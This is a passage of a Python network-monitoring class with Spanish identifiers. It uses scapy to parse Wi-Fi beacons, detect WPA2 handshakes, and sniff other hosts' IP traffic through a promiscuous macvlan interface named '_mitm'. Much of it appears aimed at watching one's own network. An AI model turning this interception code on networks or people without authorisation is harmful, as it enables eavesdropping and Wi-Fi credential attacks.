        """Extrae info de APs de beacons y probe responses."""
        try:
            from scapy.all import Dot11Elt
            ssid    = ""
            canal   = 0
            cifrado = "Open"
            rssi    = None

            # Extraer SSID
            elt = frame.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:    # SSID
                    try:
                        ssid = elt.info.decode("utf-8", errors="replace")
                    except Exception:
                        ssid = "?"
                elif elt.ID == 3:  # Canal
                    try:
                        canal = elt.info[0]
                    except Exception:
                        pass
                elif elt.ID == 48 or elt.ID == 221:  # RSN / WPA
                    cifrado = "WPA2" if elt.ID == 48 else "WPA"
                elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None

            # RSSI desde RadioTap si está disponible
            try:
                from scapy.all import RadioTap
                if frame.haslayer(RadioTap):
                    rssi = getattr(frame[RadioTap], 'dBm_AntSignal', None)
            except Exception:
                pass

            if self._callback_wifi and bssid:
                try:
                    self._callback_wifi({
                        "tipo"    : "ap_detectado",
                        "bssid"   : bssid.lower(),
                        "ssid"    : ssid,
                        "canal"   : canal,
                        "cifrado" : cifrado,
                        "rssi"    : rssi,
                        "es_nuestra_red": (
                            self._bssid and
                            bssid.lower() == self._bssid
                        )
                    })
                except Exception:
                    pass
        except Exception:
            pass

    def _procesar_eapol(self, frame, bssid, mac_src, mac_dst):
        """Detecta handshakes WPA2 — hallazgo si es nuestra red."""
        try:
            es_nuestra = (
                self._bssid and bssid and
                bssid.lower() == self._bssid
            )
            if self._callback_wifi:
                try:
                    self._callback_wifi({
                        "tipo"          : "handshake_wpa2",
                        "bssid"         : bssid,
                        "cliente_mac"   : mac_src,
                        "es_nuestra_red": es_nuestra
                    })
                except Exception:
                    pass

            if es_nuestra:
                log(f"[MONITOR] Handshake WPA2 detectado | "
                    f"cliente: {mac_src} | AP: {bssid}")
        except Exception:
            pass

    def _enrutar_a_red(self, frame, ip_layer, mac_src):
        """Envía paquete de nuestra red a la cola principal."""
        try:
            from scapy.all import TCP, UDP, ICMP

            if frame.haslayer(TCP):
                proto  = "TCP"
                puerto = frame[TCP].dport
            elif frame.haslayer(UDP):
                proto  = "UDP"
                puerto = frame[UDP].dport
            elif frame.haslayer(ICMP):
                proto  = "ICMP"
                puerto = 0
            else:
                proto  = "IP"
                puerto = 0

            datos = {
                "tipo"           : proto,
                "ip_origen"      : ip_layer.src,
                "ip_destino"     : ip_layer.dst,
                "mac_origen"     : mac_src,
                "ttl"            : ip_layer.ttl,
                "puerto_destino" : puerto,
                "bytes"          : len(frame),
                "interceptado"   : True,
                "fuente"         : "monitor_80211"
            }
            try:
                self._cola_red.put_nowait(datos)
            except queue.Full:
                pass
        except Exception:
            pass

    # ── MODO VIRTUAL: macvlan / promiscuo ─────────────────────────

    def _iniciar_virtual(self):
        self._mi_ip = self._obtener_ip(self._interfaz)
        self._interfaz_virt = self._crear_macvlan(self._interfaz)
        iface = self._interfaz_virt or self._interfaz

        threading.Thread(
            target=self._loop_captura_virtual,
            args=(iface,),
            daemon=True, name="captura-virtual").start()

        modo = "macvlan" if self._interfaz_virt else "promiscuo"
        log(f"[MONITOR] Captura virtual ({modo}) en {iface}")

    def _crear_macvlan(self, interfaz):
        nombre = interfaz + "_mitm"
        try:
            subprocess.run(["ip", "link", "delete", nombre],
                           capture_output=True, timeout=3)
        except Exception:
            pass
        try:
            r = subprocess.run(
                ["ip", "link", "add", nombre, "link", interfaz,
                 "type", "macvlan", "mode", "bridge"],
                capture_output=True, text=True, timeout=5)
            if r.returncode != 0:
                return None
            subprocess.run(["ip", "link", "set", nombre, "promisc", "on"],
                           capture_output=True, timeout=3)
            subprocess.run(["ip", "link", "set", nombre, "up"],
                           capture_output=True, timeout=3)
            return nombre
        except Exception as e:
            log(f"[MONITOR] macvlan no disponible: {e}")
            return None

    def _eliminar_macvlan(self, nombre):
        try:
            subprocess.run(["ip", "link", "delete", nombre],
                           capture_output=True, timeout=3)
        except Exception:
            pass

    def _loop_captura_virtual(self, iface):
        try:
            from scapy.all import sniff
            import warnings
            warnings.filterwarnings("ignore", category=UserWarning,
                                    module="scapy")
        except ImportError:
            return

        filtro = "ip"
        if self._mi_ip:
            filtro = f"ip and not src host {self._mi_ip}"

        while not self._stop_evt.is_set():
            try:
                sniff(iface=iface, prn=self._procesar_virtual,
                      store=False, timeout=2, filter=filtro)
            except OSError as e:
                if getattr(e, 'errno', None) == 100:
                    time.sleep(1)
                    continue
                time.sleep(1)
            except Exception:
                time.sleep(1)

    def _procesar_virtual(self, paquete):
        try:
            from scapy.all import IP, TCP, UDP, ICMP, Ether
            if not paquete.haslayer(IP):
                return
            ip_layer = paquete[IP]
            if self._mi_ip and ip_layer.dst == self._mi_ip:
                return
            mac_src = paquete[Ether].src if paquete.haslayer(Ether) else None
            if paquete.haslayer(TCP):
                proto, puerto = "TCP", paquete[TCP].dport
            elif paquete.haslayer(UDP):
                proto, puerto = "UDP", paquete[UDP].dport
            elif paquete.haslayer(ICMP):
                proto, puerto = "ICMP", 0
            else:
                proto, puerto = "IP", 0
            datos = {
                "tipo": proto, "ip_origen": ip_layer.src,
                "ip_destino": ip_layer.dst, "mac_origen": mac_src,
                "ttl": ip_layer.ttl, "puerto_destino": puerto,
                "bytes": len(paquete), "interceptado": True,
                "fuente": "virtual"
            }
            try:
                self._cola_red.put_nowait(datos)
            except queue.Full:
                pass
        except Exception:
            pass

    # ── HELPERS ────────────────────────────────────────────────────

    def _obtener_ip(self, interfaz):
        try:
            import re
            r = subprocess.run(
                ["ip", "-4", "addr", "show", interfaz],
                capture_output=True, text=True, timeout=3)
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout)
            return m.group(1) if m else None
        except Exception:
            return None

